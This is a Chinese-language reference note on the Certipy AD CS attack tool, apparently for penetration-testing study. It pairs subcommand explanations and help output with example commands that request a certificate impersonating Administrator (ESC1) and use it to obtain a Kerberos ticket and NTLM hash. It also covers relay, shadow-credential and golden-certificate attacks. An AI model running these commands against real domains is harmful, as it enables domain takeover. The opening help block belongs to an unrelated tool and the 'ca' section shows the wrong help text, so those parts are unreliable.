# Certipy基础

## 命令帮助
```BASH
┌──(wum0nster㉿wum0nster)-[~]  
└─$ certipy -h  
usage: certipy [-h] [--ca-name CA_NAME] [--overwrite] [--rm] [--cert-type {rsa}] [--bits BITS] [--valid VALID]  
               [--alt-names ALT_NAMES] [--store-dir STORE_DIR]  
               name  
​  
Certipy: Create simple, self-signed certificate authorities and certs.  
​  
positional arguments:  
  name                  Name of the cert to create, defaults to creating a CA cert. If no signing --ca-name specified.  
​  
options:  
  -h, --help            show this help message and exit  
  --ca-name CA_NAME     The name of the CA to sign this cert.  
  --overwrite           If the cert already exists, bump the serial and overwrite it.  
  --rm                  Remove the cert specified by name.  
  --cert-type {rsa}     The type of key to create.  
  --bits BITS           The number of bits to use.  
  --valid VALID         Years the cert is valid for.  
  --alt-names ALT_NAMES  
                        Alt names for the certificate (comma delimited).  
  --store-dir STORE_DIR  
                        The location for the store and certs.  
```

## 命令详解

- **`find`** - 枚举域中的 AD CS 配置。这会扫描 CA、证书模板和相关对象，突出显示潜在的错误配置或易受攻击的设置。
- **`req`** （request） - 向 CA 请求证书。此命令允许您主动尝试注册给定模板。您可以指定模板名称、CA 名称、用于请求的备用凭据、使用者名称覆盖等。它支持通过 RPC、DCOM 或 HTTP（S） 进行请求。
- **`auth`** - 使用证书进行身份验证。这本质上是一个 **“通过证书”** 作。给定 PFX（证书 + 私钥），`certipy 身份验证`将执行域身份验证 （Kerberos PKINIT），并可以使用证书检索 TGT 和 NTLM 哈希。在某些情况下，最好使用 Schannel 身份验证到 LDAP 而不是 Kerberos。
- **`relay`** - 执行针对 AD CS HTTP（S） 或 RPC 终结点 （ESC8/ESC11） 的 NTLM 中继攻击。Certipy 可以充当 NTLM 中继工具：侦听传入的 NTLM 身份验证（来自强制计算机或受害者），然后将其中继到 AD CS 注册接口，以获取为受害者颁发的证书。这可以端到端自动执行 ESC8 攻击（以及 RPC 的 ESC11），如果成功，则为受害者的帐户授予证书。
- **`shadow`** - 执行_影子凭据_攻击（通过密钥凭据进行基于证书的持久性）。此命令可以在用户上创建证书链接凭据（在 msDS-KeyCredentialLink 属性中）。使用 `certipy 影子` ，具有适当权限的攻击者可以在对象上安装证书，以便他们可以通过证书（即使不是通过典型的 AD CS 路径）作为该对象进行身份验证。
- **`forge`** - 伪造给定 CA 已泄露的证书。如果您有 CA 的私钥（例如，从脱机 CA 或备份中窃取），则此命令允许创建由该 CA 签名的任意证书（例如，“黄金证书”）。输入 CA 证书和密钥 （PFX），并指定新证书的详细信息（如 UPN、DNS 等），Certipy 将输出伪造的证书。如果根 CA 或从属 CA 受到损害，这对于持久性非常强大。
- **`ca`** - 管理证书颁发机构设置。这可以在 CA 上启用或禁用模板、批准或拒绝挂起的请求，以及添加或删除 CA 证书管理员（官员）。它对于利用后或某些攻击链期间非常有用（例如，如果您已获得通过 ESC7 修改 CA 设置的权限，则可以使用 `certipy ca` 来启用易受攻击的模板或批准您的恶意请求）。
- **`template`** - 管理 AD 中的证书模板对象。您可以将模板的配置转储到文件中，对其进行修改，然后写回。这对于 ESC4 等场景（您有权编辑模板）很有帮助：您可以使用 Certipy 更改模板设置（例如，允许 SAN 或更改权限）并稍后恢复它们。
- **`account`** - 管理与证书相关的用户/计算机帐户属性。这包括添加或修改 SPN、DNS 主机名、UPN 或帐户密码等内容。这是攻击者可能在复杂链中使用的高级命令（例如，创建具有特定名称的计算机帐户以利用证书映射）。例如，如果当前用户具有权限 （MachineAccountQuota），则 `certipy 帐户`可以创建一个新的计算机帐户，从而设置稍后可能用于攻击的属性。

> 大多数 Certipy 命令接受常见的连接选项（如 `-dc-ip`、`-u`/`-p` 用于凭据、`-hashes` 用于传递哈希、`-k` 用于来自 ccache 的 Kerberos 等）。这允许灵活的身份验证方法。例如，可以将 `-hashes` 与 NTLM 哈希一起使用，或将 `-aes` 与 Kerberos AES 密钥一起使用，以便在不知道明文密码的情况下进行身份验证。

## 使用示例 && 情形

### AD CS 枚举

攻击者运行 `certipy find` 以发现任何易受攻击的配置，查询 LDAP 的证书模板和 CA 对象。输出（控制台或文本文件）将列出所有模板、其设置，并标记任何错误配置。

certipy find \  
    -u 'attacker@corp.local' -p 'Passw0rd!' \  
    -dc-ip '10.0.0.100' -text \  
    -enabled -hide-admins

> `-hide-admins` 标志省略了列出默认管理员权限以减少噪音

### 证书请求

假设查找输出在域用户可以注册的模板上显示 **ESC1**

certipy req \  
    -u 'attacker@corp.local' -p 'Passw0rd!' \  
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \  
    -ca 'CORP-CA' -template 'UserTemplate' \  
    -upn 'Administrator@corp.local' -sid 'S-1-5-21-...-500'F

> `-ca 'CORP-CA'` 指定 CA 名称，`-target 'CA.CORP.LOCAL'` CA DNS 名称

### 身份验证

Certipy 将加载 PFX，执行 PKINIT 以获取管理员的 Kerberos TGT，甚至尝试检索 NTLM 哈希

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'

# Certipy命令全解

## 简单翻译版面

### `account`

**Manage AD user/computer accounts** Usage: `certipy account [create|read|update|delete] -user <SAMName> [options]` **管理 AD 用户/计算机帐户** 用法： `certipy account [create|read|update|delete] -user <SAMName> [options]`

Key Flags: 关键标志：

- `-group <CN=Group,...>` - Group to add the account to `-group <CN=Group,...>` - 要将帐户添加到的组
    
- `-dns <hostname>` - Set dNSHostName `-dns <hostname>` - 设置 dNSHostName
    
- `-upn <user@domain>` - Set UserPrincipalName `-upn <user@domain>` - 设置 UserPrincipalName
    
- `-sam <NewSAM>` - Set new SAM name `-sam <NewSAM>` - 设置新的 SAM 名称
    
- `-spns <SPN1,SPN2,...>` - Set SPNs `-spns <SPN1，SPN2,...>` - 设置 SPN
    
- `-pass <password>` - Set password `-pass <password>` - 设置密码
    

---

### `auth`

**Authenticate using a certificate** Usage: `certipy auth -pfx <cert.pfx> [options]` **使用证书进行身份验证** 用法： `certipy auth -pfx <cert.pfx> [options]`

Key Flags: 关键标志：

- `-password <pfx_password>` - PFX password `-password <pfx_password>` - PFX 密码
    
- `-print` - Print TGT in kirbi format `-print` - 以 kirbi 格式打印 TGT
    
- `-kirbi` - Save as .kirbi `-kirbi` - 另存为 .kirbi
    
- `-ldap-shell` - Start LDAP shell after auth `-ldap-shell` - 身份验证后启动 LDAP shell
    

---

### `ca`

**Manage CA templates and requests** Usage: `certipy ca -ca <CAName> [options]` **管理 CA 模板和请求** 用法： `certipy ca -ca <CAName> [options]`

Key Flags: 关键标志：

- `-list-templates` - List enabled templates `-list-templates` - 列出启用的模板
    
- `-enable-template <Template>` / `-disable-template` - Manage issuance `-enable-template <Template>` / `-disable-template` - 管理发行
    
- `-issue-request <ID>` / `-deny-request <ID>` - Manage requests `-issue-request <ID>` / `-deny-request <ID>` - 管理请求
    
- `-add-officer <User>` / `-remove-officer` - Manage CA managers `-add-officer <User>` / `-remove-officer` - 管理 CA 经理
    

---

### `cert`

**Import/export/manipulate local certs** Usage: `certipy cert [options]` **导入/导出/作本地证书** 用法：`certipy cert [选项]`

Key Flags: 关键标志：

- `-pfx/-key/-cert` - Input from file(s) `-pfx/-key/-cert` - 来自文件的输入
    
- `-export` - Export to new PFX `-export` - 导出到新的 PFX
    
- `-out <filename>` - Output file `-out <filename>` - 输出文件
    
- `-nocert/-nokey` - Export only one component `-nocert/-nokey` - 仅导出一个组件
    
- `-export-password` - Set output PFX password `-export-password` - 设置输出 PFX 密码
    

---

### `find`

**Enumerate AD CS config & vulnerabilities** Usage: `certipy find [options]` **枚举 AD CS 配置和漏洞** 用法：`certipy find [options]`

Key Flags: 关键标志：

- `-text/-json/-csv/-stdout` - Output format `-text/-json/-csv/-stdout` - 输出格式
    
- `-output <prefix>` - Save to files `-output <prefix>` - 保存到文件
    
- `-enabled` - Show only enabled templates `-enabled` - 仅显示已启用的模板
    
- `-vulnerable` - Show only vulnerable templates `-vulnerable` - 仅显示易受攻击的模板
    
- `-oids` - Show Issuance Policies `-oids` - 显示发行策略
    
- `-hide-admins` - Suppress admin entries `-hide-admins` - 禁止管理员条目
    

---

### `parse`

**Analyze AD CS registry exports offline** Usage: `certipy parse <file> [options]` **脱机分析 AD CS 注册表导出** 用法： `certipy parse <file> [options]`

Key Flags: 关键标志：

- `-format <bof|reg>` - Input file format `-format <bof|reg>` - 输入文件格式
    
- `-domain/-ca` - Set context info `-domain/-ca` - 设置上下文信息
    
- `-enabled` / `-vulnerable` - Filter results `-enabled` / `-vulnerable` - 过滤结果
    
- `-sids` / `-published templates` - Customize analysis `-sids` / `-published templates` - 自定义分析
    
- `-output <prefix>` - Output file prefix `-output <prefix>` - 输出文件前缀
    

---

### `forge`

**Create forged or golden certificates** Usage: `certipy forge [options]` **创建伪造证书或黄金证书** 用法：`certipy forge [选项]`

Key Flags: 关键标志：

- `-ca-pfx <file>` - CA cert/key for signing `-ca-pfx <file>` - 用于签名的 CA 证书/密钥
    
- `-subject <DN>` / `-upn` / `-dns` / `-sid` - Certificate subject info `-subject <DN>` / `-upn` / `-dns` / `-sid` - 证书主题信息
    
- `-template <file>` - Clone another cert `-template <file>` - 克隆另一个证书
    
- `-key-size <bits>` / `-validity-period <days>` - Key/cert config `-key-size <bits>` / `-validity-period <days>` - 密钥/证书配置
    
- `-out <file>` - Output forged PFX `-out <file>` - 输出锻造 PFX
    

---

### `relay`

**Perform NTLM relay to AD CS** Usage: `certipy relay -target <proto://host> [options]` **执行 NTLM 中继到 AD CS** 用法： `certipy relay -target <proto://host> [options]`

Key Flags: 关键标志：

- `-ca <CAName>` / `-template <Template>` - Certificate request details `-ca <CAName>` / `-template <Template>` - 证书请求详细信息
    
- `-out <file>` - Save cert/key `-out <file>` - 保存证书/密钥
    
- `-interface <IP>` / `-port <Port>` - Relay server bind settings `-interface <IP>` / `-port <Port>` - 中继服务器绑定设置
    
- `-forever` - Keep server alive `-永远` - 保持服务器处于活动状态
    
- `-enum-templates` - Enumerate via relay `-enum-templates` - 通过中继枚举
    
- `-retrieve <RequestID>` - Fetch existing request result `-retrieve <RequestID>` - 获取现有请求结果
    

---

### `req`

**Request certificates from AD CS** Usage: `certipy req -ca <CAName> -template <Template> [options]` **从 AD CS 请求证书** 用法： `certipy req -ca <CAName> -template <Template> [options]`

Key Flags: 关键标志：

- `-subject <DN>` / `-upn` / `-dns` / `-sid` - Request subject `-subject <DN>` / `-upn` / `-dns` / `-sid` - 请求主题
    
- `-on-behalf-of <DOMAIN\User>` - Request as another user `-on-behalf-of <DOMAIN\User>` - 以其他用户身份请求
    
- `-pfx/-pfx-password` - Auth or sign with existing PFX `-pfx/-pfx-password` - 使用现有 PFX 进行身份验证或签名
    
- `-renew` - Renew an existing cert `-renew` - 续订现有证书
    
- `-archive-key` / `-cax-cert` - Key archival options `-archive-key` / `-cax-cert` - 密钥存档选项
    
- `-web` / `-dcom` / `-dynamic-endpoint` - Request method `-web` / `-dcom` / `-dynamic-endpoint` - 请求方法
    

---

### `shadow`

**Abuse Key Credential Links / Shadow Credentials** Usage: `certipy shadow <list|add|remove|clear|info|auto> [options]` **滥用密钥凭据链接/影子凭据** 用法： `certipy shadow <list|add|remove|clear|info|auto> [options]`

Key Flags: 关键标志：

- `-account <target>` - Target account `-account <target>` - 目标帐户
    
- `-device-id <GUID>` - Specific Device ID `-device-id <GUID>` - 特定设备 ID
    
- `-out <file>` - Save certificate/key `-out <file>` - 保存证书/密钥
    

---

### `template`

**View or modify certificate template config** Usage: `certipy template -template <Name> [options]` **查看或修改证书模板配置** 用法： `certipy template -template <Name> [options]`

Key Flags: 关键标志：

- `-save-configuration <file>` - Save current config `-save-configuration <file>` - 保存当前配置
    
- `-write-configuration <file>` - Apply config from file `-write-configuration <file>` - 从文件应用配置
    
- `-write-default-configuration` - Apply ESC1-vulnerable default `-write-default-configuration` - 应用 ESC1 易受攻击的默认值
    
- `-no-save` - Skip backup `-no-save` - 跳过备份
    
- `-force` - Suppress confirmation prompts `-force` - 禁止确认提示
    

---

## Full Command Reference 完整命令参考

### Global Options 全局选项

```BASH
$ certipy -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy [-v] [-h] [-debug] {account,auth,ca,cert,find,parse,forge,relay,req,shadow,template} ...  
​  
Active Directory Certificate Services enumeration and abuse  
​  
positional arguments:  
  {account,auth,ca,cert,find,parse,forge,relay,req,shadow,template}  
                        Action  
    account             Manage user and machine accounts  
    auth                Authenticate using certificates  
    ca                  Manage CA and certificates  
    cert                Manage certificates and private keys  
    find                Enumerate AD CS  
    parse               Offline enumerate AD CS based on registry data  
    forge               Create Golden Certificates or self-signed certificates  
    relay               NTLM Relay to AD CS HTTP Endpoints  
    req                 Request certificates  
    shadow              Abuse Shadow Credentials for account takeover  
    template            Manage certificate templates  
​  
options:  
  -v, --version         Show Certipy's version number and exit  
  -h, --help            Show this help message and exit  
  -debug, --debug       Enable debug output``
```

---

### `account -h`

```BASH
$ certipy account -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy account [-h] -user SAM Account Name [-group CN=Computers,DC=test,DC=local] [-dns hostname] [-upn principal name] [-sam account name] [-spns service names] [-pass password]  
                       [-dc-ip ip address] [-dc-host hostname] [-target-ip ip address] [-target dns/ip address] [-ns ip address] [-dns-tcp] [-timeout seconds] [-u username@domain]  
                       [-p password] [-hashes [lmhash:]nthash] [-k] [-aes hex key] [-no-pass] [-ldap-scheme ldap scheme] [-ldap-port port] [-no-ldap-channel-binding] [-no-ldap-signing]  
                       [-ldap-simple-auth] [-ldap-user-dn dn]  
                       {create,read,update,delete}  
​  
Create, read, update, and delete Active Directory user and computer accounts. This command allows manipulating account properties including DNS names, service principal names (SPNs), and  
passwords.  
​  
positional arguments:  
  {create,read,update,delete}  
                        Action to perform: create (new account), read (view account properties), update (modify existing account), delete (remove account)  
​  
options:  
  -h, --help            show this help message and exit  
​  
target options:  
  -user SAM Account Name  
                        Logon name for the account to target  
  -group CN=Computers,DC=test,DC=local  
                        Group to which the account will be added. If omitted, CN=Computers,<default path> will be used  
​  
attribute options:  
  -dns hostname         Set the DNS hostname for the account (e.g., computer.domain.local)  
  -upn principal name   Set the User Principal Name for the account (e.g., user@domain.local)  
  -sam account name     Set the SAM Account Name for the account (e.g., computer$ or username)  
  -spns service names   Set the Service Principal Names for the account (comma-separated)  
  -pass password        Set the password for the account  
​  
connection options:  
  -dc-ip ip address     IP address of the domain controller. If omitted, it will use the domain part (FQDN) specified in the target parameter  
  -dc-host hostname     Hostname of the domain controller. Required for Kerberos authentication during certain operations. If omitted, the domain part (FQDN) specified in the account  
                        parameter will be used  
  -target-ip ip address  
                        IP address of the target machine. If omitted, it will use whatever was specified as target. Useful when target is the NetBIOS name and cannot be resolved  
  -target dns/ip address  
                        DNS name or IP address of the target machine. Required for Kerberos authentication  
  -ns ip address        Nameserver for DNS resolution  
  -dns-tcp              Use TCP instead of UDP for DNS queries  
  -timeout seconds      Timeout for connections in seconds (default: 10)  
​  
authentication options:  
  -u username@domain, -username username@domain  
                        Username to authenticate with  
  -p password, -password password  
                        Password for authentication  
  -hashes [lmhash:]nthash  
                        NTLM hash  
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the  
                        ones specified in the command line  
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)  
  -no-pass              Don't ask for password (useful for -k)  
​  
ldap options:  
  -ldap-scheme ldap scheme  
                        LDAP connection scheme to use (default: ldaps)  
  -ldap-port port       Port for LDAP communication (default: 636 for ldaps, 389 for ldap)  
  -no-ldap-channel-binding  
                        Don't use LDAP channel binding for LDAP communication (LDAPS only)  
  -no-ldap-signing      Don't use LDAP signing for LDAP communication (LDAP only)  
  -ldap-simple-auth     Use SIMPLE LDAP authentication instead of NTLM  
  -ldap-user-dn dn      Distinguished Name of target account for LDAP authentication
```

---

### `auth -h`

```BASH
$ certipy auth -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy auth [-h] -pfx pfx/p12 file name [-password password] [-no-save] [-no-hash] [-print] [-kirbi] [-dc-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds]  
                    [-username username] [-domain domain] [-ldap-shell] [-ldap-scheme ldap scheme] [-ldap-port port] [-ldap-user-dn dn]  
​  
Authenticate to Active Directory services using certificates. This command enables certificate-based authentication to obtain Kerberos tickets, NT hashes, or establish LDAP connections.  
​  
options:  
  -h, --help            show this help message and exit  
​  
certificate options:  
  -pfx pfx/p12 file name  
                        Path to certificate and private key (PFX/P12 format)  
  -password password    Password for the PFX/P12 file  
​  
output options:  
  -no-save              Don't save Kerberos TGT to file  
  -no-hash              Don't request NT hash from Kerberos  
  -print                Print Kerberos TGT in Kirbi format to console  
  -kirbi                Save Kerberos TGT in Kirbi format (default is ccache)  
​  
connection options:  
  -dc-ip ip address     IP Address of the domain controller. If omitted, it will use the domain part (FQDN) specified in the target parameter  
  -ns nameserver        Nameserver for DNS resolution  
  -dns-tcp              Use TCP instead of UDP for DNS queries  
  -timeout seconds      Timeout for connections in seconds  
​  
authentication options:  
  -username username    Username to authenticate as (extracted from certificate if omitted)  
  -domain domain        Domain name to authenticate to (extracted from certificate if omitted)  
  -ldap-shell           Authenticate with the certificate via Schannel against LDAP  
​  
ldap options:  
  -ldap-scheme ldap scheme  
                        LDAP connection scheme to use (default: ldaps)  
  -ldap-port port       Port for LDAP communication (default: 636 for ldaps, 389 for ldap)  
  -ldap-user-dn dn      Distinguished Name of target account for LDAP authentication
```

---

### `ca -h`

```BASH
$ certipy cert -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy cert [-h] [-pfx infile] [-password password] [-key infile] [-cert infile] [-export] [-out outfile] [-nocert] [-nokey] [-export-password password]  
​  
Import, export, and manipulate certificates and private keys locally. This command supports various operations like converting between formats, extracting components, and creating PFX  
files.  
​  
options:  
  -h, --help            show this help message and exit  
​  
input options:  
  -pfx infile           Load certificate and private key from PFX/P12 file  
  -password password    Password for the input PFX/P12 file  
  -key infile           Load private key from PEM or DER file  
  -cert infile          Load certificate from PEM or DER file  
​  
output options:  
  -export               Export to PFX/P12 file (default format)  
  -out outfile          Output filename for the exported certificate/key  
  -nocert               Don't include certificate in output (key only)  
  -nokey                Don't include private key in output (certificate only)  
  -export-password password  
                        Password to protect the output PFX/P12 file
```

---

### `cert -h`

```BASH
$ certipy cert -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy cert [-h] [-pfx infile] [-password password] [-key infile] [-cert infile] [-export] [-out outfile] [-nocert] [-nokey] [-export-password password]  
​  
Import, export, and manipulate certificates and private keys locally. This command supports various operations like converting between formats, extracting components, and creating PFX  
files.  
​  
options:  
  -h, --help            show this help message and exit  
​  
input options:  
  -pfx infile           Load certificate and private key from PFX/P12 file  
  -password password    Password for the input PFX/P12 file  
  -key infile           Load private key from PEM or DER file  
  -cert infile          Load certificate from PEM or DER file  
​  
output options:  
  -export               Export to PFX/P12 file (default format)  
  -out outfile          Output filename for the exported certificate/key  
  -nocert               Don't include certificate in output (key only)  
  -nokey                Don't include private key in output (certificate only)  
  -export-password password  
                        Password to protect the output PFX/P12 file
```

---

### `find -h`

```BASH
$ certipy find -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy find [-h] [-text] [-stdout] [-json] [-csv] [-output prefix] [-enabled] [-dc-only] [-vulnerable] [-oids] [-hide-admins] [-sid object sid] [-dn distinguished name]  
                    [-dc-ip ip address] [-dc-host hostname] [-target-ip ip address] [-target dns/ip address] [-ns ip address] [-dns-tcp] [-timeout seconds] [-u username@domain]  
                    [-p password] [-hashes [lmhash:]nthash] [-k] [-aes hex key] [-no-pass] [-ldap-scheme ldap scheme] [-ldap-port port] [-no-ldap-channel-binding] [-no-ldap-signing]  
                    [-ldap-simple-auth] [-ldap-user-dn dn]  
​  
Discover and analyze AD CS components. This command identifies vulnerable certificate templates, security misconfigurations, and potential  
certificate-based privilege escalation paths.  
​  
options:  
  -h, --help            show this help message and exit  
​  
output options:  
  -text                 Output result as formatted text file  
  -stdout               Output result as text directly to console  
  -json                 Output result as JSON  
  -csv                  Output result as CSV  
  -output prefix        Filename prefix for writing results to  
​  
find options:  
  -enabled              Show only enabled certificate templates  
  -dc-only              Collects data only from the domain controller. Will not try to retrieve CA security/configuration or check for Web Enrollment  
  -vulnerable           Show only vulnerable certificate templates based on nested group memberships  
  -oids                 Show OIDs (Issuance Policies) and their properties  
  -hide-admins          Don't show administrator permissions for -text, -stdout, -json, and -csv  
​  
identity options:  
  -sid object sid       SID of the user provided in the command line. Useful for cross domain authentication  
  -dn distinguished name  
                        Distinguished name of the user provided in the command line. Useful for cross domain authentication  
​  
connection options:  
  -dc-ip ip address     IP address of the domain controller. If omitted, it will use the domain part (FQDN) specified in the target parameter  
  -dc-host hostname     Hostname of the domain controller. Required for Kerberos authentication during certain operations. If omitted, the domain part (FQDN) specified in the account  
                        parameter will be used  
  -target-ip ip address  
                        IP address of the target machine. If omitted, it will use whatever was specified as target. Useful when target is the NetBIOS name and cannot be resolved  
  -target dns/ip address  
                        DNS name or IP address of the target machine. Required for Kerberos authentication  
  -ns ip address        Nameserver for DNS resolution  
  -dns-tcp              Use TCP instead of UDP for DNS queries  
  -timeout seconds      Timeout for connections in seconds (default: 10)  
​  
authentication options:  
  -u username@domain, -username username@domain  
                        Username to authenticate with  
  -p password, -password password  
                        Password for authentication  
  -hashes [lmhash:]nthash  
                        NTLM hash  
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the  
                        ones specified in the command line  
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)  
  -no-pass              Don't ask for password (useful for -k)  
​  
ldap options:  
  -ldap-scheme ldap scheme  
                        LDAP connection scheme to use (default: ldaps)  
  -ldap-port port       Port for LDAP communication (default: 636 for ldaps, 389 for ldap)  
  -no-ldap-channel-binding  
                        Don't use LDAP channel binding for LDAP communication (LDAPS only)  
  -no-ldap-signing      Don't use LDAP signing for LDAP communication (LDAP only)  
  -ldap-simple-auth     Use SIMPLE LDAP authentication instead of NTLM  
  -ldap-user-dn dn      Distinguished Name of target account for LDAP authentication
```

---

### `parse -h`

```BASH
$ certipy parse -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy parse [-h] [-text] [-stdout] [-json] [-csv] [-output prefix] [-format format] [-domain domain name] [-ca ca name] [-sids sids] [-published templates] [-enabled]  
                     [-vulnerable] [-hide-admins]  
                     file  
​  
Parse and analyze certificate templates from exported registry data. This allows assessment of AD CS security without direct domain access.  
​  
positional arguments:  
  file                  File to parse (BOF output or .reg file from registry export)  
​  
options:  
  -h, --help            show this help message and exit  
​  
output options:  
  -text                 Output result as formatted text file  
  -stdout               Output result as text directly to console  
  -json                 Output result as JSON  
  -csv                  Output result as CSV  
  -output prefix        Filename prefix for writing results to  
​  
parse options:  
  -format format        Input format: BOF output or Windows .reg file (default: bof)  
  -domain domain name   Domain name. Only used for output context (default: UNKNOWN)  
  -ca ca name           CA name. Only used for output context (default: UNKNOWN)  
  -sids sids            Consider the comma separated list of SIDs as owned for vulnerability assessment  
  -published templates  Consider the comma separated list of template names as published in AD  
​  
filter options:  
  -enabled              Show only enabled certificate templates  
  -vulnerable           Show only vulnerable certificate templates based on nested group memberships  
  -hide-admins          Don't show administrator permissions for -text, -stdout, -json, and -csv output
```

---

### `forge -h`

```BASH
$ certipy forge -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy forge [-h] [-ca-pfx pfx/p12 file name] [-ca-password password] [-upn alternative UPN] [-dns alternative DNS] [-sid alternative Object SID] [-subject subject]  
                     [-template pfx/p12 file name] [-issuer issuer] [-crl ldap path] [-serial serial number] [-application-policies Application Policy [Application Policy ...]]  
                     [-smime encryption algorithm] [-key-size RSA key length] [-validity-period days] [-out output file name] [-pfx-password password]  
​  
Forge certificates using a compromised CA certificate or generate a self-signed CA. This allows creating certificates for any identity in the domain or creating standalone certificate  
chains.  
​  
options:  
  -h, --help            show this help message and exit  
  -ca-pfx pfx/p12 file name  
                        Path to CA certificate and private key (PFX/P12 format). If not specified, a self-signed root CA will be generated  
  -ca-password password  
                        Password for the CA PFX file  
​  
subject alternative name options:  
  -upn alternative UPN  User Principal Name to include in the Subject Alternative Name  
  -dns alternative DNS  DNS name to include in the Subject Alternative Name  
  -sid alternative Object SID  
                        Object SID to include in the Subject Alternative Name  
  -subject subject      Subject to include in certificate, e.g. CN=Administrator,CN=Users,DC=CORP,DC=LOCAL  
​  
certificate content options:  
  -template pfx/p12 file name  
                        Path to template certificate to clone properties from  
  -issuer issuer        Issuer to include in certificate. If not specified, the issuer from the CA cert will be used  
  -crl ldap path        LDAP path to a CRL distribution point  
  -serial serial number  
                        Custom serial number for the certificate  
  -application-policies Application Policy [Application Policy ...]  
                        Specify application policies for the certificate request using OIDs (e.g., '1.3.6.1.4.1.311.10.3.4' or 'Client Authentication')  
  -smime encryption algorithm  
                        Specify SMIME Extension that gets added to CSR (e.g., des, rc4, 3des, aes128, aes192, aes256)  
​  
key options:  
  -key-size RSA key length  
                        Length of RSA key (default: 2048)  
​  
validity options:  
  -validity-period days  
                        Validity period in days (default: 365)  
​  
output options:  
  -out output file name  
                        Path to save the forged certificate and private key (PFX format)  
  -pfx-password password  
                        Password to protect the output PFX file
```

---

### `relay -h`

```BASH
$ certipy relay -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy relay [-h] -target protocol://<ip address or hostname> [-ca certificate authority name] [-template template name] [-upn alternative UPN] [-dns alternative DNS]  
                     [-sid alternative Object SID] [-subject subject] [-retrieve request ID] [-key-size RSA key length] [-archive-key cax cert file] [-pfx-password PFX file password]  
                     [-application-policies Application Policy [Application Policy ...]] [-smime encryption algorithm] [-out output file name] [-interface ip address] [-port port number]  
                     [-forever] [-no-skip] [-enum-templates] [-timeout seconds]  
​  
Perform NTLM relay attacks against Active Directory Certificate Services. This allows obtaining certificates for relayed users and computers, which can be used for authentication and  
potential privilege escalation.  
​  
options:  
  -h, --help            show this help message and exit  
  -target protocol://<ip address or hostname>  
                        protocol://<IP address or hostname> of certificate authority. Example: http://CA.CORP.LOCAL for ESC8 or rpc://CA.CORP.LOCAL for ESC11  
​  
certificate request options:  
  -ca certificate authority name  
                        CA name to request certificate from. Example: 'CORP-CA'. Only required for RPC relay (ESC11)  
  -template template name  
                        If omitted, the template 'Machine' or 'User' is chosen by default depending on whether the relayed account name ends with '$'. Relaying a DC should require  
                        specifying the 'DomainController' template  
  -upn alternative UPN  User Principal Name to include in the Subject Alternative Name  
  -dns alternative DNS  DNS name to include in the Subject Alternative Name  
  -sid alternative Object SID  
                        Object SID to include in the Subject Alternative Name  
  -subject subject      Subject to include in certificate, e.g. CN=Administrator,CN=Users,DC=CORP,DC=LOCAL  
  -retrieve request ID  Retrieve an issued certificate specified by a request ID instead of requesting a new certificate  
  -key-size RSA key length  
                        Length of RSA key (default: 2048)  
  -archive-key cax cert file  
                        Specify CAX Certificate for Key Archival. You can request the cax cert with 'certipy req -cax-cert'  
  -pfx-password PFX file password  
                        Password for the PFX file  
  -application-policies Application Policy [Application Policy ...]  
                        Specify application policies for the certificate request using OIDs (e.g., '1.3.6.1.4.1.311.10.3.4' or 'Client Authentication')  
  -smime encryption algorithm  
                        Specify SMIME Extension that gets added to CSR (e.g., des, rc4, 3des, aes128, aes192, aes256)  
​  
output options:  
  -out output file name  
                        Path to save the certificate and private key (PFX format)  
​  
server options:  
  -interface ip address  
                        IP Address of interface to listen on (default: 0.0.0.0)  
  -port port number     Port to listen on (default: 445)  
​  
relay options:  
  -forever              Don't stop the relay server after the first successful relay  
  -no-skip              Don't skip previously attacked users (use with -forever)  
  -enum-templates       Relay to /certsrv/certrqxt.asp and parse available certificate templates  
​  
connection options:  
  -timeout seconds      Timeout for connections in seconds (default: 10)
```

---

### `req -h`

```BASH
$ certipy req -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy req [-h] [-ca certificate authority name] [-template template name] [-upn alternative UPN] [-dns alternative DNS] [-sid alternative Object SID] [-subject subject]  
                   [-retrieve request ID] [-on-behalf-of domain\account] [-pfx pfx/p12 file name] [-pfx-password PFX file password] [-key-size RSA key length] [-archive-key] [-cax-cert]  
                   [-renew] [-application-policies Application Policy [Application Policy ...]] [-smime encryption algorithm] [-out output file name] [-web] [-dcom] [-dynamic-endpoint]  
                   [-http-scheme http scheme] [-http-port port number] [-no-channel-binding] [-dc-ip ip address] [-dc-host hostname] [-target-ip ip address] [-target dns/ip address]  
                   [-ns ip address] [-dns-tcp] [-timeout seconds] [-u username@domain] [-p password] [-hashes [lmhash:]nthash] [-k] [-aes hex key] [-no-pass] [-ldap-scheme ldap scheme]  
                   [-ldap-port port] [-no-ldap-channel-binding] [-no-ldap-signing] [-ldap-simple-auth] [-ldap-user-dn dn]  
​  
Request and retrieve certificates from AD CS. This command supports multiple enrollment protocols and certificate template types.  
​  
options:  
  -h, --help            show this help message and exit  
  -ca certificate authority name  
                        Name of the Certificate Authority to request certificates from. Required for RPC and DCOM methods  
​  
certificate request options:  
  -template template name  
                        Certificate template to request (default: User)  
  -upn alternative UPN  User Principal Name to include in the Subject Alternative Name  
  -dns alternative DNS  DNS name to include in the Subject Alternative Name  
  -sid alternative Object SID  
                        Object SID to include in the Subject Alternative Name  
  -subject subject      Subject to include in certificate, e.g. CN=Administrator,CN=Users,DC=CORP,DC=LOCAL  
  -retrieve request ID  Retrieve an issued certificate specified by a request ID instead of requesting a new certificate  
  -on-behalf-of domain\account  
